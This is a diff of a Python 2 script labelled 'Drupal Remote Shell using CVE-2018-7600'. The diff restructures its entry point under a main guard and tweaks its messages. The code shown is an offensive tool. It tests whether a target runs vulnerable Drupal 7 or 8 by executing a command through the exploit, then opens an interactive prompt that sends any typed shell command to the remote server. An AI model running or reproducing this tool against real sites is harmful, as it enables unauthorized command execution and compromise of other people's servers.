@@ -5,19 +5,6 @@ import sys
 import urllib
 import urllib2
 
-print '\n############################################################'
-print '#                                                          #'
-print '#   Drupal Remote Shell using CVE-2018-7600                #'
-print '#   Use : DRS.py HostPath                                  #'
-print '#   https://github.com/antonio-fr/DrupalRS                 #'
-print '#                                                          #'
-print '############################################################\n'
-
-if len(sys.argv)!=2:
-	print "Use : DRS.py http[s]://hostname|IP"
-	sys.exit()
-target = sys.argv[1]
-
 def post_data(path, data_dict):
 	req = urllib2.Request(path)
 	req.add_header('Content-type', 'multipart/form-data')
@@ -65,29 +52,41 @@ def rem_shell(domain, version, cmd):
 def testvuln(site):
 	try:
 		if get_output(send_cmd_v7(site, 'printf', 'ABCZ\n')) == 'ABCZ':
-			print "This server hosts a vulnerable Drupal v7"
+			print "This server hosts a vulnerable Drupal v7     "
 			return 7
 	except:
 		pass
 	try:
 		if get_output(send_cmd_v8(site, 'printf', 'ABCZ\n')) == 'ABCZ':
-			print "This server hosts a vulnerable Drupal v8"
+			print "This server hosts a vulnerable Drupal v8     "
 			return 8
 	except:
 		pass
 	return 0
 
-version = testvuln(target)
-if version != 8 and version != 7:
-	print "This server doesn't host a vulnerable Drupal"
-	sys.exit()
-dmn = target.split("://")[1]
-print "Connected to",dmn
-print "# CTRL+D RETURN to quit\n"
-while True:
-	cmd = raw_input("[drupal@"+dmn+" ~]#")
-	if cmd == "\x04":
-		break
-	print rem_shell(target, version, cmd)
-print "logout"
-
+if __name__ == "__main__":
+	if len(sys.argv)!=2 or not sys.argv[1].startswith("http"):
+		print "\nUse : DRS.py http[s]://hostname|IP\n"
+		sys.exit()
+	target = sys.argv[1]
+	print '\n############################################################'
+	print '#                                                          #'
+	print '#   Drupal Remote Shell using CVE-2018-7600                #'
+	print '#   Use : DRS.py HostPath                                  #'
+	print '#   https://github.com/antonio-fr/DrupalRS                 #'
+	print '#                                                          #'
+	print '############################################################\n'
+	dmn = target.split("://")[1]
+	print "Testing",dmn,"WAIT ...\r",
+	version = testvuln(target)
+	if version != 8 and version != 7:
+		print "This server doesn't host a vulnerable Drupal     "
+		sys.exit()
+	print "Connected to",dmn
+	print "# CTRL+D RETURN to quit\n"
+	while True:
+		cmd = raw_input("[drupal@"+dmn+" ~]#")
+		if cmd == "\x04":
+			break
+		print rem_shell(target, version, cmd)
+	print "logout"
